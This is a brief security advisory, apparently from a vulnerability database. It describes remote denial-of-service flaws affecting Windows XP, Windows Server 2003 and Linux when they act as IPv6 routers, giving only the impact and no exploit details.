Multiple operating systems are prone to remote denial-of-service vulnerabilities that occur when affected operating systems are acting as IPv6 routers.

Successful exploits allow remote attackers to cause computers to consume excessive CPU resources or to stop responding to advertised routes in a network. This will potentially deny further network services to legitimate users.

Microsoft Windows XP, Microsoft Windows Server 2003, and Linux are prone to these issues. Other operating systems may also be affected.
